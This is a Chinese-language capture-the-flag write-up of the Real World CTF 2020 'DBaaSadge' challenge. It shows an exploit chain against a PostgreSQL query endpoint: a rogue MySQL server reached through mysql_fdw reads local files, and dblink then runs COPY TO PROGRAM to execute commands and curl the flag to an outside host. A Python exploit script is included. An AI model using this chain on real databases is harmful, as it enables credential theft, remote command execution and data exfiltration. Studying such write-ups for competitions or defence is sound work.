date: 2021-01-14
categories:
- 比赛
tags:
- web
- ctf
- wp
title: real world ctf 2020
---
# Real World CTF 2020

比赛很棒，题目很好，我很菜

## DBaaSadge

就一个PostgreSQL任意语句执行，给的权限不是superuser，但大部分操作是能进行的

```php
<?php
error_reporting(0);

if(!$sql=(string)$_GET["sql"]){
  show_source(__FILE__);
  die();
}

header('Content-Type: text/plain');

if(strlen($sql)>100){
  die('That query is too long ;_;');
}

if(!pg_pconnect('dbname=postgres user=realuser')){
  die('DB gone ;_;');
}

if($query = pg_query($sql)){
  print_r(pg_fetch_all($query));
} else {
  die('._.?');
}

```

题目提供了docker文件

看下Dockerfile发现：

```
安装了postgresql-10-mysql-fdw
还开启了dblink
```

相关的介绍文章：

https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/

https://www.postgresql.org/docs/10/contrib-dblink-function.html

一个是远程连接mysql，一个是远程连接postgresql 。

mysql客户端有个非常有名的漏洞：`Load data local infile '/etc/passwd' into table proc;`，即客户端文件读取，利用https://github.com/allyshka/Rogue-MySql-Server 搭建一个恶意mysql服务端成功读取到文件


```
CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host'ccreater.top',port'63306')
CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username 'a', password 'a');
CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname 'a',table_name 'a')
select * from c
```

结合dblink很自然的想到读取postgress数据库存储文件获得superuser密码再任意命令执行

通过本地搭建环境获得数据库文件位置：/var/lib/postgresql/10/main/base

已查找一下postgresql为关键词查找文件得到密码所在文件：

`/var/lib/postgresql/10/main/global/1260`

查找一下postgresql的加密规则：md5(password+username)



exp.py
```python

import requests

sqls=[
      "CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host'ccreater.top',port'63306')",
      "CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username 'a', password 'a')",
      "CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname 'a',table_name 'a')",
      "select * from c"
]
sqls=[
      "select dblink('host=0 password=jpr5q','copy(select)to program''curl y5pwcd.ceye.io/`/readflag`''')"
]
def hack(sql):
      burp0_url = "http://54.219.197.26:60080/"
      burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
      r= requests.get(burp0_url, headers=burp0_headers,params={
            "sql":sql
      })
      print(r.text)

for sql in sqls:
      hack(sql)
```

rwctf{pop_cat_says_p1ea5e_upd4t3_youR_libmysqlclient_kekW}